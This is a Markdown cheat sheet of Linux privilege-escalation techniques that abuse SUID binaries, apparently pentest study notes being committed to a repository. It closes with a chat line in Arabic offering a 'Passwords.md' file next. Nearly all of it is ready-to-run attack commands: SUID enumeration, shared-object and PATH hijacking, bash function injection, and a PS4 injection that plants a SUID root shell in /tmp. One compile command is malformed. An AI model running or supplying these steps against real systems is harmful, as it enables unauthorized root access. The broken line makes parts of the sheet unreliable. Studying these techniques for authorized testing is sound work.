---------------------------------------------
# Linux Privilege Escalation - SUID Exploits
---------------------------------------------
## Fast Enumeration Plan
find / -perm -4000 2>/dev/null
file /path/to/suid_binary
strings /path/to/suid_binary
strace /path/to/suid_binary 2>&1 | grep "no such"
### 1. Known Exploit
Check the version and search for CVEs.
exim --version
searchsploit exim 4.84
./exploit.sh
### 2. Shared Object Hijack
Works when the binary tries to load a `.so` from a writable path.
strace /usr/local/bin/suid-so 2>&1 | grep "no such file"
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
./suid-so
### 3. PATH Hijack
Works when the binary runs a command without a full path.
strings /usr/local/bin/suid-env | grep service
gcc -o service.c
export PATH=.:$PATH
./suid-env
### 4. Bash Function Injection - Bash < 4.2
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/sbin/service
### 5. Bash PS4 Injection - Bash < 4.4
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' ./suid-env2
/tmp/rootbash -p

4. Commit message:
Add SUID exploits writeup

خلصت؟ قولي "Done SUID" وأعطيك آخر ملف `Passwords.md`
